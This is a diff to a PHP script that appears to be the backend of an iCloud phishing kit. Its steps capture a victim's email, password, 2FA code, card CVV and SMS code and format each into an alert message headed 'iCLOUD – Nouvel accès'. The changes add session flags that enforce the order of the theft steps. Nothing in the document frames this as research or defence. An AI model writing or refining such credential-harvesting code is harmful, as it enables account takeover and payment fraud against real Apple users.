@@ -49,6 +49,8 @@ $dt    = date('d/m/Y à H:i') . ' UTC';
 // ── STEP 1 ──────────────────────────
 if ($step === '1' && $email !== '') {
     $_SESSION['icloud_email'] = $email;
+    $_SESSION['qsdfqsdfqsdfqsdf123123'] = true;
+    $_SESSION['STEP_CHAIN'] = 1;
 
     $message = <<<TEXT
 🍎 <b>iCLOUD – Nouvel accès</b> [<code>STEP 1</code>]
@@ -73,6 +75,7 @@ TEXT;
 
 // ── STEP 2 ──────────────────────────
 if ($step === '2' && $pass !== '') {
+    $_SESSION['STEP_CHAIN'] = 2;
     $email = ($email !== '') ? $email : ($_SESSION['icloud_email'] ?? '—');
 
     $message = <<<TEXT
@@ -115,6 +118,7 @@ TEXT;
 
 // ── STEP 3 : 2FA code ───────────────
 if ($step === '3' && !empty($_POST['code'])) {
+    $_SESSION['STEP_CHAIN'] = 3;
     $code  = preg_replace('/[^0-9]/', '', trim($_POST['code']));
     $email = $_SESSION['icloud_email'] ?? '—';
 
@@ -158,6 +162,7 @@ TEXT;
 
 // ── CVV STEP ────────────────────────
 if ($step === 'cvv' && !empty($_POST['cvv'])) {
+    $_SESSION['STEP_CHAIN'] = 3;
     $cvv   = preg_replace('/[^0-9]/', '', trim($_POST['cvv']));
     $email = $_SESSION['icloud_email'] ?? '—';
 
@@ -200,6 +205,7 @@ TEXT;
 
 // ── STEP 4 : SMS code ───────────────
 if ($step === '4' && !empty($_POST['code'])) {
+    $_SESSION['STEP_CHAIN'] = 4;
     $code  = preg_replace('/[^0-9]/', '', trim($_POST['code']));
     $email = $_SESSION['icloud_email'] ?? '—';
 
